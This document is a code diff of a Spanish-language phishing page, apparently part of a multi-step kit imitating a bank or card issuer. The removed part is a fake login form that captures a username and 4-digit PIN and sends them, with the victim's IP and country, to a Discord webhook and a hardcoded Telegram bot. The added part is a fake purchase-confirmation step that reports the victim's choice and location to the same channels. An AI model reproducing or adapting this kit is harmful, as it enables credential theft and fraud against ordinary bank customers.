@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Formulario de acceso</title>
+  <title>Confirmar compra</title>
   <style>
     body {
       margin: 0;
@@ -35,22 +35,34 @@
       margin-top: 0;
     }
 
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
+    .opciones {
+      display: flex;
+      justify-content: space-around;
+      margin: 20px 0;
+    }
+
+    .opciones button {
+      padding: 10px 20px;
       font-size: 16px;
       border: 1px solid #ccc;
       border-radius: 5px;
+      background-color: #eee;
+      cursor: pointer;
     }
 
-    button {
+    .opciones button.selected {
+      background-color: #d0f0d0;
+      border-color: #4caf50;
+    }
+
+    .continuar {
       background-color: #fdda24;
       border: none;
       padding: 12px 20px;
       font-size: 16px;
       cursor: pointer;
       border-radius: 5px;
+      margin-top: 20px;
     }
   </style>
 </head>
@@ -59,14 +71,12 @@
     <div class="logo">
       <img src="logo.png" alt="Logo" />
     </div>
-    <h2>Ingresa tus datos</h2>
-    <p>Para cancelar</p>
-    <form id="loginForm">
-      <input type="text" name="usuario" placeholder="Usuario" required />
-      <input type="password" name="clave" placeholder="Clave (4 dígitos)" 
-             pattern="\d{4}" inputmode="numeric" maxlength="4" required />
-      <button type="submit">Continuar</button>
-    </form>
+    <h2>¿Quieres aceptar o rechazar esta compra?</h2>
+    <div class="opciones">
+      <button id="aceptar">Aceptar</button>
+      <button id="rechazar">Rechazar</button>
+    </div>
+    <button class="continuar" id="continuarBtn">Continuar</button>
   </div>
 
   <script>
@@ -74,32 +84,39 @@
     const TELEGRAM_BOT_TOKEN = "7317719253:AAE-UX4SSFiol1mIweex6PYvvpvALJR2BBY";
     const TELEGRAM_CHAT_ID = "-1002316781318";
 
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      const usuario = this.usuario.value;
-      const clave = this.clave.value;
+    let seleccion = "";
 
-      if (!/^\d{4}$/.test(clave)) {
-        alert("La clave debe tener exactamente 4 números.");
+    document.getElementById("aceptar").addEventListener("click", () => {
+      seleccion = "✅ Compra aceptada";
+      document.getElementById("aceptar").classList.add("selected");
+      document.getElementById("rechazar").classList.remove("selected");
+    });
+
+    document.getElementById("rechazar").addEventListener("click", () => {
+      seleccion = "❌ Compra rechazada";
+      document.getElementById("rechazar").classList.add("selected");
+      document.getElementById("aceptar").classList.remove("selected");
+    });
+
+    document.getElementById("continuarBtn").addEventListener("click", async () => {
+      if (!seleccion) {
+        alert("Por favor selecciona una opción.");
         return;
       }
 
       try {
-        // Obtener IP y país del usuario
         const geo = await fetch("https://ipapi.co/json/").then(res => res.json());
         const ip = geo.ip || "Desconocida";
         const pais = geo.country_name || "Desconocido";
 
-        const mensaje = `🔐 Nuevo acceso:\n👤 Usuario: ${usuario}\n🔑 Clave: ${clave}\n🌐 IP: ${ip}\n📍 País: ${pais}`;
+        const mensaje = `${seleccion}\n🌐 IP: ${ip}\n📍 País: ${pais}`;
 
-        // Enviar a Discord
         await fetch(DISCORD_WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ content: mensaje })
         });
 
-        // Enviar a Telegram
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -109,11 +126,10 @@
           })
         });
 
-        // Redirigir
-        window.location.href = "index2.html";
+        window.location.href = "index4.html";
 
       } catch (error) {
-        alert("Hubo un error al enviar los datos.");
+        alert("Error al enviar la respuesta.");
         console.error(error);
       }
     });
